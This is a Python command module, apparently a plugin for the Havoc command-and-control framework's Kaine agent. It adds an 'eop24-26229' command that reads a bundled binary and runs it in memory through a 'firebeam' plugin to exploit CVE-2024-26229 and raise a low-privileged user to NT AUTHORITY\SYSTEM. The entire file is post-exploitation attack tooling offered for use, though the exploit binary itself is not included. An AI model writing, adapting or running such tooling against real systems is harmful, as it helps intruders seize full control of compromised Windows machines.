from os.path import exists, dirname, basename
from pyhavoc.agent import *


def file_read( path: str ) -> bytes:
    handle    = open( path, 'rb' )
    obj_bytes = handle.read()

    handle.close()

    return obj_bytes


class EoP24_26229( HcKaineCommand ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.command     = "eop24-26229"
        self.description = "CVE-2024-26229 exploit to elevate privilege to NT AUTHORITY\\SYSTEM from low privileged user"
        self.file        = dirname( __file__ ) + '/bin/eop24-26229.x64.bin'

        return

    def execute(
        self,
        args: list[str]
    ):
        kaine    : HcKaine = self.agent()
        task_uuid: int     = 0

        if not hasattr( kaine, 'firebeam_execute' ):
            self.log_error( "firebeam plugin not found or installed" )
            return

        self.log_info( f'trying to elevate privileges to NT AUTHORITY\\SYSTEM using CVE-2024-26229' )

        try:
            ret, response, task_uuid = kaine.firebeam_execute( file_read( self.file ) )
        except Exception as e:
            self.log_error( f"failed to execute exploit: {e}" )
            return

        self.log_info( f"exploit output [{len(response)} bytes]:" )
        self.log_raw( response.decode( 'utf-8' ) )

        self.log_good( f"successfully executed exploit [uuid: {task_uuid:x}]" )

        return

